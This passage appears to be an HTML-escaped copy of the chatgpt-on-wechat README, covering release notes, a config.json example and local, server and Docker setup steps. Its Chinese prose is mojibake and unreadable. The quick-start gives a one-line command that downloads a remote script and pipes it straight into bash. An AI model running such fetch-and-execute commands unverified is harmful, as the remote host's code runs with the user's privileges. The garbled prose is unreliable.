 &lt;p&gt;&lt;strong&gt;2025.05.23Ôºö&lt;/strong&gt; &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/releases/tag/1.7.6"&gt;1.7.6ÁâàÊú¨&lt;/a&gt; ‰ºòÂåñwebÁΩëÈ°µchannel„ÄÅÊñ∞Â¢û &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/raw/master/plugins/agent/README.md"&gt;AgentMesh&lt;/a&gt;Â§öÊô∫ËÉΩ‰ΩìÊèí‰ª∂„ÄÅÁôæÂ∫¶ËØ≠Èü≥ÂêàÊàê‰ºòÂåñ„ÄÅ‰ºÅÂæÆÂ∫îÁî®&lt;code&gt;access_token&lt;/code&gt;Ëé∑Âèñ‰ºòÂåñ„ÄÅÊîØÊåÅ&lt;code&gt;claude-4-sonnet&lt;/code&gt;Âíå&lt;code&gt;claude-4-opus&lt;/code&gt;Ê®°Âûã&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;2025.04.11Ôºö&lt;/strong&gt; &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/releases/tag/1.7.5"&gt;1.7.5ÁâàÊú¨&lt;/a&gt; Êñ∞Â¢ûÊîØÊåÅ &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/pull/2562"&gt;wechatferry&lt;/a&gt; ÂçèËÆÆ„ÄÅÊñ∞Â¢û deepseek Ê®°Âûã„ÄÅÊñ∞Â¢ûÊîØÊåÅËÖæËÆØ‰∫ëËØ≠Èü≥ËÉΩÂäõ„ÄÅÊñ∞Â¢ûÊîØÊåÅ ModelScope Âíå Gitee-AI APIÊé•Âè£&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;2024.12.13Ôºö&lt;/strong&gt; &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/releases/tag/1.7.4"&gt;1.7.4ÁâàÊú¨&lt;/a&gt; Êñ∞Â¢û Gemini 2.0 Ê®°Âûã„ÄÅÊñ∞Â¢ûweb channel„ÄÅËß£ÂÜ≥ÂÜÖÂ≠òÊ≥ÑÊºèÈóÆÈ¢ò„ÄÅËß£ÂÜ≥ &lt;code&gt;#reloadp&lt;/code&gt; ÂëΩ‰ª§ÈáçËΩΩ‰∏çÁîüÊïàÈóÆÈ¢ò&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;2024.10.31Ôºö&lt;/strong&gt; &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/releases/tag/1.7.3"&gt;1.7.3ÁâàÊú¨&lt;/a&gt; Á®ãÂ∫èÁ®≥ÂÆöÊÄßÊèêÂçá„ÄÅÊï∞ÊçÆÂ∫ìÂäüËÉΩ„ÄÅClaudeÊ®°Âûã‰ºòÂåñ„ÄÅlinkaiÊèí‰ª∂‰ºòÂåñ„ÄÅÁ¶ªÁ∫øÈÄöÁü•&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;Êõ¥Â§öÊõ¥Êñ∞ÂéÜÂè≤ËØ∑Êü•Áúã: &lt;a href="https://raw.githubusercontent.com/zhayujie/chatgpt-on-wechat/master/docs/release/history.md"&gt;Êõ¥Êñ∞Êó•Âøó&lt;/a&gt;&lt;/p&gt; 
&lt;br /&gt; 
&lt;h1&gt;üöÄ Âø´ÈÄüÂºÄÂßã&lt;/h1&gt; 
&lt;p&gt;È°πÁõÆÊèê‰æõ‰∫Ü‰∏ÄÈîÆÂÆâË£Ö„ÄÅÈÖçÁΩÆ„ÄÅÂêØÂä®„ÄÅÁÆ°ÁêÜÁ®ãÂ∫èÁöÑËÑöÊú¨ÔºåÊé®Ëçê‰ΩøÁî®ËÑöÊú¨Âø´ÈÄüËøêË°åÔºå‰πüÂèØ‰ª•Ê†πÊçÆ‰∏ãÊñá‰∏≠ÁöÑËØ¶ÁªÜÊåáÂºï‰∏ÄÊ≠•Ê≠•ÂÆâË£ÖËøêË°å„ÄÇ&lt;/p&gt; 
&lt;p&gt;Âú®ÁªàÁ´ØÊâßË°å‰ª•‰∏ãÂëΩ‰ª§Ôºö&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;bash &amp;lt;(curl -sS https://cdn.link-ai.tech/code/cow/run.sh)
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;ËÑöÊú¨‰ΩøÁî®ËØ¥ÊòéÔºö&lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/wiki/CowAgentQuickStart"&gt;‰∏ÄÈîÆËøêË°åËÑöÊú¨&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;‰∏Ä„ÄÅÂáÜÂ§á&lt;/h2&gt; 
&lt;h3&gt;1. Ê®°ÂûãAPI&lt;/h3&gt; 
&lt;p&gt;È°πÁõÆÊîØÊåÅÂõΩÂÜÖÂ§ñ‰∏ªÊµÅÂéÇÂïÜÁöÑÊ®°ÂûãÊé•Âè£ÔºåÂèØÈÄâÊ®°ÂûãÂèäÈÖçÁΩÆËØ¥ÊòéÂèÇËÄÉÔºö&lt;a href="https://raw.githubusercontent.com/zhayujie/chatgpt-on-wechat/master/#%E6%A8%A1%E5%9E%8B%E8%AF%B4%E6%98%8E"&gt;Ê®°ÂûãËØ¥Êòé&lt;/a&gt;„ÄÇ&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Ê≥®ÔºöAgentÊ®°Âºè‰∏ãÊé®Ëçê‰ΩøÁî®‰ª•‰∏ãÊ®°ÂûãÔºåÂèØÊ†πÊçÆÊïàÊûúÂèäÊàêÊú¨ÁªºÂêàÈÄâÊã©ÔºöMiniMAx(MiniMax-M2.1)„ÄÅGLM(glm-4.7)„ÄÅQwen(qwen3-max)„ÄÅClaude(claude-sonnet-4-5„ÄÅclaude-sonnet-4-0)„ÄÅGemini(gemini-3-flash-preview„ÄÅgemini-3-pro-preview)&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;ÂêåÊó∂ÊîØÊåÅ‰ΩøÁî® &lt;strong&gt;LinkAIÂπ≥Âè∞&lt;/strong&gt; Êé•Âè£ÔºåÂèØÁÅµÊ¥ªÂàáÊç¢ OpenAI„ÄÅClaude„ÄÅGemini„ÄÅDeepSeek„ÄÅQwen„ÄÅKimi Á≠âÂ§öÁßçÂ∏∏Áî®Ê®°ÂûãÔºåÂπ∂ÊîØÊåÅÁü•ËØÜÂ∫ì„ÄÅÂ∑•‰ΩúÊµÅ„ÄÅÊèí‰ª∂Á≠âAgentËÉΩÂäõÔºåÂèÇËÄÉ &lt;a href="https://docs.link-ai.tech/platform/api"&gt;Êé•Âè£ÊñáÊ°£&lt;/a&gt;„ÄÇ&lt;/p&gt; 
&lt;h3&gt;2.ÁéØÂ¢ÉÂÆâË£Ö&lt;/h3&gt; 
&lt;p&gt;ÊîØÊåÅ Linux„ÄÅMacOS„ÄÅWindows Êìç‰ΩúÁ≥ªÁªüÔºåÂèØÂú®‰∏™‰∫∫ËÆ°ÁÆóÊú∫ÂèäÊúçÂä°Âô®‰∏äËøêË°åÔºåÈúÄÂÆâË£Ö &lt;code&gt;Python&lt;/code&gt;ÔºåPythonÁâàÊú¨ÈúÄÂú®3.7 ~ 3.12 ‰πãÈó¥ÔºåÊé®Ëçê‰ΩøÁî®3.9ÁâàÊú¨„ÄÇ&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Ê≥®ÊÑèÔºöAgentÊ®°ÂºèÊé®Ëçê‰ΩøÁî®Ê∫êÁ†ÅËøêË°åÔºåËã•ÈÄâÊã©DockerÈÉ®ÁΩ≤ÂàôÊó†ÈúÄÂÆâË£ÖpythonÁéØÂ¢ÉÂíå‰∏ãËΩΩÊ∫êÁ†ÅÔºåÂèØÁõ¥Êé•Âø´ËøõÂà∞‰∏ã‰∏ÄËäÇ„ÄÇ&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;strong&gt;(1) ÂÖãÈöÜÈ°πÁõÆ‰ª£Á†ÅÔºö&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;git clone https://github.com/zhayujie/chatgpt-on-wechat
cd chatgpt-on-wechat/
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Ëã•ÈÅáÂà∞ÁΩëÁªúÈóÆÈ¢òÂèØ‰ΩøÁî®ÂõΩÂÜÖ‰ªìÂ∫ìÂú∞ÂùÄÔºö&lt;a href="https://gitee.com/zhayujie/chatgpt-on-wechat"&gt;https://gitee.com/zhayujie/chatgpt-on-wechat&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;(2) ÂÆâË£ÖÊ†∏ÂøÉ‰æùËµñ (ÂøÖÈÄâ)Ôºö&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;pip3 install -r requirements.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;(3) ÊãìÂ±ï‰æùËµñ (ÂèØÈÄâÔºåÂª∫ËÆÆÂÆâË£Ö)Ôºö&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;pip3 install -r requirements-optional.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Â¶ÇÊûúÊüêÈ°π‰æùËµñÂÆâË£ÖÂ§±Ë¥•ÂèØÊ≥®ÈáäÊéâÂØπÂ∫îÁöÑË°åÂêéÈáçËØï„ÄÇ&lt;/p&gt; 
&lt;h2&gt;‰∫å„ÄÅÈÖçÁΩÆ&lt;/h2&gt; 
&lt;p&gt;ÈÖçÁΩÆÊñá‰ª∂ÁöÑÊ®°ÊùøÂú®Ê†πÁõÆÂΩïÁöÑ&lt;code&gt;config-template.json&lt;/code&gt;‰∏≠ÔºåÈúÄÂ§çÂà∂ËØ•Ê®°ÊùøÂàõÂª∫ÊúÄÁªàÁîüÊïàÁöÑ &lt;code&gt;config.json&lt;/code&gt; Êñá‰ª∂Ôºö&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;  cp config-template.json config.json
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;ÁÑ∂ÂêéÂú®&lt;code&gt;config.json&lt;/code&gt;‰∏≠Â°´ÂÖ•ÈÖçÁΩÆÔºå‰ª•‰∏ãÊòØÂØπÈªòËÆ§ÈÖçÁΩÆÁöÑËØ¥ÊòéÔºåÂèØÊ†πÊçÆÈúÄË¶ÅËøõË°åËá™ÂÆö‰πâ‰øÆÊîπÔºàÊ≥®ÊÑèÂÆûÈôÖ‰ΩøÁî®Êó∂ËØ∑ÂéªÊéâÊ≥®ÈáäÔºå‰øùËØÅJSONÊ†ºÂºèÁöÑËßÑËåÉÔºâÔºö&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# config.json Êñá‰ª∂ÂÜÖÂÆπÁ§∫‰æã
{
  "channel_type": "web",                                      # Êé•ÂÖ•Ê∏†ÈÅìÁ±ªÂûãÔºåÈªòËÆ§‰∏∫webÔºåÊîØÊåÅ‰øÆÊîπ‰∏∫:feishu,dingtalk,wechatcom_app,terminal,wechatmp,wechatmp_service
  "model": "MiniMax-M2.1",                                    # Ê®°ÂûãÂêçÁß∞
  "minimax_api_key": "",                                      # MiniMax API Key
  "zhipu_ai_api_key": "",                                     # Êô∫Ë∞±GLM API Key
  "dashscope_api_key": "",                                    # ÁôæÁÇº(ÈÄö‰πâÂçÉÈóÆ)API Key
  "claude_api_key": "",                                       # Claude API Key
  "claude_api_base": "https://api.anthropic.com/v1",          # Claude API Âú∞ÂùÄÔºå‰øÆÊîπÂèØÊé•ÂÖ•‰∏âÊñπ‰ª£ÁêÜÂπ≥Âè∞
  "gemini_api_key": "",                                       # Gemini API Key
  "gemini_api_base": "https://generativelanguage.googleapis.com", # Gemini APIÂú∞ÂùÄ
  "open_ai_api_key": "",                                      # OpenAI API Key
  "open_ai_api_base": "https://api.openai.com/v1",            # OpenAI API Âú∞ÂùÄ
  "linkai_api_key": "",                                       # LinkAI API Key
  "proxy": "",                                                # ‰ª£ÁêÜÂÆ¢Êà∑Á´ØÁöÑipÂíåÁ´ØÂè£ÔºåÂõΩÂÜÖÁéØÂ¢ÉÈúÄË¶ÅÂºÄÂêØ‰ª£ÁêÜÁöÑÂèØÂ°´ÂÜôËØ•È°πÔºåÂ¶Ç "127.0.0.1:7890"
  "speech_recognition": false,                                # ÊòØÂê¶ÂºÄÂêØËØ≠Èü≥ËØÜÂà´
  "group_speech_recognition": false,                          # ÊòØÂê¶ÂºÄÂêØÁæ§ÁªÑËØ≠Èü≥ËØÜÂà´
  "voice_reply_voice": false,                                 # ÊòØÂê¶‰ΩøÁî®ËØ≠Èü≥ÂõûÂ§çËØ≠Èü≥
  "use_linkai": false,                                        # ÊòØÂê¶‰ΩøÁî®LinkAIÊé•Âè£ÔºåÈªòËÆ§ÂÖ≥Èó≠ÔºåËÆæÁΩÆ‰∏∫trueÂêéÂèØÂØπÊé•LinkAIÂπ≥Âè∞Êé•Âè£
  "agent": true,                                              # ÊòØÂê¶ÂêØÁî®AgentÊ®°ÂºèÔºåÂêØÁî®ÂêéÊã•ÊúâÂ§öËΩÆÂ∑•ÂÖ∑ÂÜ≥Á≠ñ„ÄÅÈïøÊúüËÆ∞ÂøÜ„ÄÅSkillsËÉΩÂäõÁ≠â
  "agent_workspace": "~/cow",                                 # AgentÁöÑÂ∑•‰ΩúÁ©∫Èó¥Ë∑ØÂæÑÔºåÁî®‰∫éÂ≠òÂÇ®memory„ÄÅskills„ÄÅÁ≥ªÁªüËÆæÂÆöÁ≠â
  "agent_max_context_tokens": 40000,                          # AgentÊ®°Âºè‰∏ãÊúÄÂ§ß‰∏ä‰∏ãÊñátokensÔºåË∂ÖÂá∫Â∞ÜËá™Âä®‰∏¢ÂºÉÊúÄÊó©ÁöÑ‰∏ä‰∏ãÊñá
  "agent_max_context_turns": 30,                              # AgentÊ®°Âºè‰∏ãÊúÄÂ§ß‰∏ä‰∏ãÊñáËÆ∞ÂøÜËΩÆÊ¨°ÔºåÊØèËΩÆÂåÖÊã¨‰∏ÄÊ¨°Áî®Êà∑ÊèêÈóÆÂíåAIÂõûÂ§ç
  "agent_max_steps": 15                                       # AgentÊ®°Âºè‰∏ãÂçïÊ¨°‰ªªÂä°ÁöÑÊúÄÂ§ßÂÜ≥Á≠ñÊ≠•Êï∞ÔºåË∂ÖÂá∫ÂêéÂ∞ÜÂÅúÊ≠¢ÁªßÁª≠Ë∞ÉÁî®Â∑•ÂÖ∑
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;ÈÖçÁΩÆË°•ÂÖÖËØ¥Êòé:&lt;/strong&gt;&lt;/p&gt; 
&lt;details&gt; 
 &lt;summary&gt;1. ËØ≠Èü≥ÈÖçÁΩÆ&lt;/summary&gt; 
 &lt;ul&gt; 
  &lt;li&gt;Ê∑ªÂä† &lt;code&gt;"speech_recognition": true&lt;/code&gt; Â∞ÜÂºÄÂêØËØ≠Èü≥ËØÜÂà´ÔºåÈªòËÆ§‰ΩøÁî®openaiÁöÑwhisperÊ®°ÂûãËØÜÂà´‰∏∫ÊñáÂ≠óÔºåÂêåÊó∂‰ª•ÊñáÂ≠óÂõûÂ§çÔºåËØ•ÂèÇÊï∞‰ªÖÊîØÊåÅÁßÅËÅä (Ê≥®ÊÑèÁî±‰∫éËØ≠Èü≥Ê∂àÊÅØÊó†Ê≥ïÂåπÈÖçÂâçÁºÄÔºå‰∏ÄÊó¶ÂºÄÂêØÂ∞ÜÂØπÊâÄÊúâËØ≠Èü≥Ëá™Âä®ÂõûÂ§çÔºåÊîØÊåÅËØ≠Èü≥Ëß¶ÂèëÁîªÂõæ)Ôºõ&lt;/li&gt; 
  &lt;li&gt;Ê∑ªÂä† &lt;code&gt;"group_speech_recognition": true&lt;/code&gt; Â∞ÜÂºÄÂêØÁæ§ÁªÑËØ≠Èü≥ËØÜÂà´ÔºåÈªòËÆ§‰ΩøÁî®openaiÁöÑwhisperÊ®°ÂûãËØÜÂà´‰∏∫ÊñáÂ≠óÔºåÂêåÊó∂‰ª•ÊñáÂ≠óÂõûÂ§çÔºåÂèÇÊï∞‰ªÖÊîØÊåÅÁæ§ËÅä (‰ºöÂåπÈÖçgroup_chat_prefixÂíågroup_chat_keyword, ÊîØÊåÅËØ≠Èü≥Ëß¶ÂèëÁîªÂõæ)Ôºõ&lt;/li&gt; 
  &lt;li&gt;Ê∑ªÂä† &lt;code&gt;"voice_reply_voice": true&lt;/code&gt; Â∞ÜÂºÄÂêØËØ≠Èü≥ÂõûÂ§çËØ≠Èü≥ÔºàÂêåÊó∂‰ΩúÁî®‰∫éÁßÅËÅäÂíåÁæ§ËÅäÔºâ&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;2. ÂÖ∂‰ªñÈÖçÁΩÆ&lt;/summary&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;model&lt;/code&gt;: Ê®°ÂûãÂêçÁß∞ÔºåAgentÊ®°Âºè‰∏ãÊé®Ëçê‰ΩøÁî® &lt;code&gt;MiniMax-M2.1&lt;/code&gt;„ÄÅ&lt;code&gt;glm-4.7&lt;/code&gt;„ÄÅ&lt;code&gt;qwen3-max&lt;/code&gt;„ÄÅ&lt;code&gt;claude-sonnet-4-5&lt;/code&gt;„ÄÅ&lt;code&gt;claude-sonnet-4-0&lt;/code&gt;„ÄÅ&lt;code&gt;gemini-3-flash-preview&lt;/code&gt;„ÄÅ&lt;code&gt;gemini-3-pro-preview&lt;/code&gt;ÔºåÂÖ®ÈÉ®Ê®°ÂûãÂêçÁß∞ÂèÇËÄÉ&lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/raw/master/common/const.py"&gt;common/const.py&lt;/a&gt;Êñá‰ª∂&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;character_desc&lt;/code&gt;ÔºöÊôÆÈÄöÂØπËØùÊ®°Âºè‰∏ãÁöÑÊú∫Âô®‰∫∫Á≥ªÁªüÊèêÁ§∫ËØç„ÄÇÂú®AgentÊ®°Âºè‰∏ãËØ•ÈÖçÁΩÆ‰∏çÁîüÊïàÔºåÁî±Â∑•‰ΩúÁ©∫Èó¥‰∏≠ÁöÑÊñá‰ª∂ÂÜÖÂÆπÊûÑÊàê„ÄÇ&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;subscribe_msg&lt;/code&gt;ÔºöËÆ¢ÈòÖÊ∂àÊÅØÔºåÂÖ¨‰ºóÂè∑Âíå‰ºÅ‰∏öÂæÆ‰ø°channel‰∏≠ËØ∑Â°´ÂÜôÔºåÂΩìË¢´ËÆ¢ÈòÖÊó∂‰ºöËá™Âä®ÂõûÂ§çÔºå ÂèØ‰ΩøÁî®ÁâπÊÆäÂç†‰ΩçÁ¨¶„ÄÇÁõÆÂâçÊîØÊåÅÁöÑÂç†‰ΩçÁ¨¶Êúâ{trigger_prefix}ÔºåÂú®Á®ãÂ∫è‰∏≠ÂÆÉ‰ºöËá™Âä®ÊõøÊç¢ÊàêbotÁöÑËß¶ÂèëËØç„ÄÇ&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;5. LinkAIÈÖçÁΩÆ&lt;/summary&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;use_linkai&lt;/code&gt;: ÊòØÂê¶‰ΩøÁî®LinkAIÊé•Âè£ÔºåÈªòËÆ§ÂÖ≥Èó≠ÔºåËÆæÁΩÆ‰∏∫trueÂêéÂèØÂØπÊé•LinkAIÂπ≥Âè∞Ôºå‰ΩøÁî®Áü•ËØÜÂ∫ì„ÄÅÂ∑•‰ΩúÊµÅ„ÄÅÊèí‰ª∂Á≠âËÉΩÂäõ, ÂèÇËÄÉ&lt;a href="https://docs.link-ai.tech/platform/api/chat"&gt;Êé•Âè£ÊñáÊ°£&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;linkai_api_key&lt;/code&gt;: LinkAI Api KeyÔºåÂèØÂú® &lt;a href="https://link-ai.tech/console/interface"&gt;ÊéßÂà∂Âè∞&lt;/a&gt; ÂàõÂª∫&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;linkai_app_code&lt;/code&gt;: LinkAI Â∫îÁî®ÊàñÂ∑•‰ΩúÊµÅÁöÑcodeÔºåÈÄâÂ°´ÔºåÊôÆÈÄöÂØπËØùÊ®°Âºè‰∏≠‰ΩøÁî®„ÄÇ&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;p&gt;Ê≥®ÔºöÂÖ®ÈÉ®ÈÖçÁΩÆÈ°πËØ¥ÊòéÂèØÂú® &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/raw/master/config.py"&gt;&lt;code&gt;config.py&lt;/code&gt;&lt;/a&gt; Êñá‰ª∂‰∏≠Êü•Áúã„ÄÇ&lt;/p&gt; 
&lt;h2&gt;‰∏â„ÄÅËøêË°å&lt;/h2&gt; 
&lt;h3&gt;1.Êú¨Âú∞ËøêË°å&lt;/h3&gt; 
&lt;p&gt;Â¶ÇÊûúÊòØ‰∏™‰∫∫ËÆ°ÁÆóÊú∫ &lt;strong&gt;Êú¨Âú∞ËøêË°å&lt;/strong&gt;ÔºåÁõ¥Êé•Âú®È°πÁõÆÊ†πÁõÆÂΩï‰∏ãÊâßË°åÔºö&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;python3 app.py         # windowsÁéØÂ¢É‰∏ãËØ•ÂëΩ‰ª§ÈÄöÂ∏∏‰∏∫ python app.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;ËøêË°åÂêéÈªòËÆ§‰ºöÂêØÂä®webÊúçÂä°ÔºåÂèØÈÄöËøáËÆøÈóÆ &lt;code&gt;http://localhost:9899/chat&lt;/code&gt; Âú®ÁΩëÈ°µÁ´ØÂØπËØù„ÄÇ&lt;/p&gt; 
&lt;p&gt;Â¶ÇÊûúÈúÄË¶ÅÊé•ÂÖ•ÂÖ∂‰ªñÂ∫îÁî®ÈÄöÈÅìÂè™ÈúÄ‰øÆÊîπ &lt;code&gt;config.json&lt;/code&gt; ÈÖçÁΩÆÊñá‰ª∂‰∏≠ÁöÑ &lt;code&gt;channel_type&lt;/code&gt; ÂèÇÊï∞ÔºåËØ¶ÊÉÖÂèÇËÄÉÔºö&lt;a href="https://raw.githubusercontent.com/zhayujie/chatgpt-on-wechat/master/#%E9%80%9A%E9%81%93%E8%AF%B4%E6%98%8E"&gt;ÈÄöÈÅìËØ¥Êòé&lt;/a&gt;„ÄÇ&lt;/p&gt; 
&lt;h3&gt;2.ÊúçÂä°Âô®ÈÉ®ÁΩ≤&lt;/h3&gt; 
&lt;p&gt;Âú®ÊúçÂä°Âô®‰∏≠ÂèØ‰ΩøÁî® &lt;code&gt;nohup&lt;/code&gt; ÂëΩ‰ª§Âú®ÂêéÂè∞ËøêË°åÁ®ãÂ∫èÔºö&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;nohup python3 app.py &amp;amp; tail -f nohup.out
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;ÊâßË°åÂêéÁ®ãÂ∫èËøêË°å‰∫éÊúçÂä°Âô®ÂêéÂè∞ÔºåÂèØÈÄöËøá &lt;code&gt;ctrl+c&lt;/code&gt; ÂÖ≥Èó≠Êó•ÂøóÔºå‰∏ç‰ºöÂΩ±ÂìçÂêéÂè∞Á®ãÂ∫èÁöÑËøêË°å„ÄÇ‰ΩøÁî® &lt;code&gt;ps -ef | grep app.py | grep -v grep&lt;/code&gt; ÂëΩ‰ª§ÂèØÊü•ÁúãËøêË°å‰∫éÂêéÂè∞ÁöÑËøõÁ®ãÔºåÂ¶ÇÊûúÊÉ≥Ë¶ÅÈáçÊñ∞ÂêØÂä®Á®ãÂ∫èÂèØ‰ª•ÂÖà &lt;code&gt;kill&lt;/code&gt; ÊéâÂØπÂ∫îÁöÑËøõÁ®ã„ÄÇ Êó•ÂøóÂÖ≥Èó≠ÂêéÂ¶ÇÊûúÊÉ≥Ë¶ÅÂÜçÊ¨°ÊâìÂºÄÂè™ÈúÄËæìÂÖ• &lt;code&gt;tail -f nohup.out&lt;/code&gt;„ÄÇ&lt;/p&gt; 
&lt;p&gt;Ê≠§Â§ñÔºåÈ°πÁõÆÁöÑ &lt;code&gt;scripts&lt;/code&gt; ÁõÆÂΩï‰∏ãÊúâ‰∏ÄÈîÆËøêË°å„ÄÅÂÖ≥Èó≠Á®ãÂ∫èÁöÑËÑöÊú¨‰æõ‰ΩøÁî®„ÄÇ ËøêË°åÂêéÈªòËÆ§channel‰∏∫webÔºåÈÄöËøáÂèØ‰ª•ÈÄöËøá‰øÆÊîπÈÖçÁΩÆÊñá‰ª∂ËøõË°åÂàáÊç¢„ÄÇ&lt;/p&gt; 
&lt;h3&gt;3.DockerÈÉ®ÁΩ≤&lt;/h3&gt; 
&lt;p&gt;‰ΩøÁî®dockerÈÉ®ÁΩ≤Êó†ÈúÄ‰∏ãËΩΩÊ∫êÁ†ÅÂíåÂÆâË£Ö‰æùËµñÔºåÂè™ÈúÄË¶ÅËé∑Âèñ &lt;code&gt;docker-compose.yml&lt;/code&gt; ÈÖçÁΩÆÊñá‰ª∂Âπ∂ÂêØÂä®ÂÆπÂô®Âç≥ÂèØ„ÄÇAgentÊ®°Âºè‰∏ãÊõ¥Êé®Ëçê‰ΩøÁî®Ê∫êÁ†ÅËøõË°åÈÉ®ÁΩ≤Ôºå‰ª•Ëé∑ÂæóÊõ¥Â§öÁ≥ªÁªüËÆøÈóÆËÉΩÂäõ„ÄÇ&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;ÂâçÊèêÊòØÈúÄË¶ÅÂÆâË£ÖÂ•Ω &lt;code&gt;docker&lt;/code&gt; Âèä &lt;code&gt;docker-compose&lt;/code&gt;ÔºåÂÆâË£ÖÊàêÂäüÂêéÊâßË°å &lt;code&gt;docker -v&lt;/code&gt; Âíå &lt;code&gt;docker-compose version&lt;/code&gt; (Êàñ &lt;code&gt;docker compose version&lt;/code&gt;) ÂèØÊü•ÁúãÂà∞ÁâàÊú¨Âè∑„ÄÇÂÆâË£ÖÂú∞ÂùÄ‰∏∫ &lt;a href="https://docs.docker.com/engine/install/"&gt;dockerÂÆòÁΩë&lt;/a&gt; „ÄÇ&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;strong&gt;(1) ‰∏ãËΩΩ docker-compose.yml Êñá‰ª∂&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;wget https://cdn.link-ai.tech/code/cow/docker-compose.yml
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;‰∏ãËΩΩÂÆåÊàêÂêéÊâìÂºÄ &lt;code&gt;docker-compose.yml&lt;/code&gt; Â°´ÂÜôÊâÄÈúÄÈÖçÁΩÆÔºå‰æãÂ¶Ç &lt;code&gt;CHANNEL_TYPE&lt;/code&gt;„ÄÅ&lt;code&gt;OPEN_AI_API_KEY&lt;/code&gt; ÂíåÁ≠âÈÖçÁΩÆ„ÄÇ&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;(2) ÂêØÂä®ÂÆπÂô®&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Âú® &lt;code&gt;docker-compose.yml&lt;/code&gt; ÊâÄÂú®ÁõÆÂΩï‰∏ãÊâßË°å‰ª•‰∏ãÂëΩ‰ª§ÂêØÂä®ÂÆπÂô®Ôºö&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;sudo docker compose up -d         # Ëã•docker-compose‰∏∫ 1.X ÁâàÊú¨ÔºåÂàôÊâßË°å `sudo  docker-compose up -d`
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;ËøêË°åÂëΩ‰ª§ÂêéÔºå‰ºöËá™Âä®Âèñ &lt;a href="https://hub.docker.com/r/zhayujie/chatgpt-on-wechat"&gt;docker hub&lt;/a&gt; ÊãâÂèñÊúÄÊñ∞releaseÁâàÊú¨ÁöÑÈïúÂÉè„ÄÇÂΩìÊâßË°å &lt;code&gt;sudo docker ps&lt;/code&gt; ËÉΩÊü•ÁúãÂà∞ NAMES ‰∏∫ chatgpt-on-wechat ÁöÑÂÆπÂô®Âç≥Ë°®Á§∫ËøêË°åÊàêÂäü„ÄÇÊúÄÂêéÊâßË°å‰ª•‰∏ãÂëΩ‰ª§ÂèØÊü•ÁúãÂÆπÂô®ÁöÑËøêË°åÊó•ÂøóÔºö&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;sudo docker logs -f chatgpt-on-wechat
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;(3) Êèí‰ª∂‰ΩøÁî®&lt;/strong&gt;&lt;/p&gt; 
